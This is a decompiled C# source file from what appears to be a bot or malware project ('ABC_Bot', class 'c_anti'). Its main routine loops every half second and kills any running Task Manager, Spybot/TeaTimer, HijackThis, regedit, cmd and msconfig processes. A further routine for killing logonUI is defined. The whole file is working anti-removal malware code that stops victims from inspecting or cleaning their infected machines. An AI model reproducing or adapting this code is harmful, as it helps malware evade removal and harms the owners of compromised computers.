using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace ABC_Bot;

public class c_anti
{
	[DebuggerNonUserCode]
	public c_anti()
	{
	}

	public static object intervall()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_004d;
				case 150:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 4:
							goto IL_000a;
						case 5:
							goto IL_0012;
						case 6:
							goto IL_001a;
						case 7:
							goto IL_0022;
						case 8:
							goto IL_002a;
						case 9:
							goto IL_0032;
						case 10:
							goto IL_003b;
						case 2:
						case 3:
						case 11:
							goto IL_004d;
						default:
							goto end_IL_0000;
						case 12:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_003b:
					num = 10;
					Thread.Sleep(Conversions.ToInteger("500"));
					goto IL_004d;
					IL_0032:
					num = 9;
					msconfig();
					goto IL_003b;
					IL_004d:
					num = 3;
					goto IL_000a;
					IL_000a:
					num = 4;
					taskmgr();
					goto IL_0012;
					IL_0012:
					num = 5;
					spybot();
					goto IL_001a;
					IL_001a:
					num = 6;
					hijackthis();
					goto IL_0022;
					IL_0022:
					num = 7;
					regedit();
					goto IL_002a;
					IL_002a:
					num = 8;
					cmd();
					goto IL_0032;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 150;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	private static object taskmgr()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 93:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_002c;
						default:
							goto end_IL_0000;
						case 5:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_001f:
					num = 3;
					process.Kill();
					num5 = checked(num5 + 1);
					goto IL_002c;
					IL_002c:
					num = 4;
					goto IL_002f;
					IL_0009:
					num = 2;
					processesByName = Process.GetProcessesByName("taskmgr");
					num5 = 0;
					goto IL_002f;
					IL_002f:
					if (num5 < processesByName.Length)
					{
						process = processesByName[num5];
						goto IL_001f;
					}
					goto end_IL_0000_2;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 93;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	private static object logonUI()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 93:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_002c;
						default:
							goto end_IL_0000;
						case 5:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_001f:
					num = 3;
					process.Kill();
					num5 = checked(num5 + 1);
					goto IL_002c;
					IL_002c:
					num = 4;
					goto IL_002f;
					IL_0009:
					num = 2;
					processesByName = Process.GetProcessesByName("logonUI");
					num5 = 0;
					goto IL_002f;
					IL_002f:
					if (num5 < processesByName.Length)
					{
						process = processesByName[num5];
						goto IL_001f;
					}
					goto end_IL_0000_2;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 93;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	private static object spybot()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		int num6 = default(int);
		Process process2 = default(Process);
		Process[] processesByName2 = default(Process[]);
		Process[] processesByName3 = default(Process[]);
		int num7 = default(int);
		Process process3 = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 234:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_0023;
							case 4:
								goto IL_0032;
							case 5:
								goto IL_003d;
							case 6:
								goto IL_0057;
							case 7:
								goto IL_0066;
							case 8:
								goto IL_0071;
							case 9:
								goto IL_008b;
							case 10:
								goto IL_009b;
							default:
								goto end_IL_0000;
							case 11:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_0066:
						num = 7;
						goto IL_0069;
						IL_0057:
						num = 6;
						process.Kill();
						num5++;
						goto IL_0066;
						IL_0009:
						num = 2;
						processesByName = Process.GetProcessesByName("teatimer");
						num6 = 0;
						goto IL_0035;
						IL_0035:
						if (num6 < processesByName.Length)
						{
							process2 = processesByName[num6];
							goto IL_0023;
						}
						goto IL_003d;
						IL_003d:
						num = 5;
						processesByName2 = Process.GetProcessesByName("spybot");
						num5 = 0;
						goto IL_0069;
						IL_0069:
						if (num5 < processesByName2.Length)
						{
							process = processesByName2[num5];
							goto IL_0057;
						}
						goto IL_0071;
						IL_0071:
						num = 8;
						processesByName3 = Process.GetProcessesByName("spybot-sd");
						num7 = 0;
						goto IL_009f;
						IL_009f:
						if (num7 < processesByName3.Length)
						{
							process3 = processesByName3[num7];
							goto IL_008b;
						}
						goto end_IL_0000_2;
						IL_0032:
						num = 4;
						goto IL_0035;
						IL_008b:
						num = 9;
						process3.Kill();
						num7++;
						goto IL_009b;
						IL_009b:
						num = 10;
						goto IL_009f;
						IL_0023:
						num = 3;
						process2.Kill();
						num6++;
						goto IL_0032;
						end_IL_0000:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 234;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	private static object hijackthis()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 93:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_002c;
						default:
							goto end_IL_0000;
						case 5:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_001f:
					num = 3;
					process.Kill();
					num5 = checked(num5 + 1);
					goto IL_002c;
					IL_002c:
					num = 4;
					goto IL_002f;
					IL_0009:
					num = 2;
					processesByName = Process.GetProcessesByName("hijackthis");
					num5 = 0;
					goto IL_002f;
					IL_002f:
					if (num5 < processesByName.Length)
					{
						process = processesByName[num5];
						goto IL_001f;
					}
					goto end_IL_0000_2;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 93;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	private static object regedit()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 93:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_002c;
						default:
							goto end_IL_0000;
						case 5:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_001f:
					num = 3;
					process.Kill();
					num5 = checked(num5 + 1);
					goto IL_002c;
					IL_002c:
					num = 4;
					goto IL_002f;
					IL_0009:
					num = 2;
					processesByName = Process.GetProcessesByName("regedit");
					num5 = 0;
					goto IL_002f;
					IL_002f:
					if (num5 < processesByName.Length)
					{
						process = processesByName[num5];
						goto IL_001f;
					}
					goto end_IL_0000_2;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 93;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	private static object cmd()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 93:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_002c;
						default:
							goto end_IL_0000;
						case 5:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_001f:
					num = 3;
					process.Kill();
					num5 = checked(num5 + 1);
					goto IL_002c;
					IL_002c:
					num = 4;
					goto IL_002f;
					IL_0009:
					num = 2;
					processesByName = Process.GetProcessesByName("cmd");
					num5 = 0;
					goto IL_002f;
					IL_002f:
					if (num5 < processesByName.Length)
					{
						process = processesByName[num5];
						goto IL_001f;
					}
					goto end_IL_0000_2;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 93;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	private static object msconfig()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 93:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_002c;
						default:
							goto end_IL_0000;
						case 5:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_001f:
					num = 3;
					process.Kill();
					num5 = checked(num5 + 1);
					goto IL_002c;
					IL_002c:
					num = 4;
					goto IL_002f;
					IL_0009:
					num = 2;
					processesByName = Process.GetProcessesByName("msconfig");
					num5 = 0;
					goto IL_002f;
					IL_002f:
					if (num5 < processesByName.Length)
					{
						process = processesByName[num5];
						goto IL_001f;
					}
					goto end_IL_0000_2;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 93;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}
}
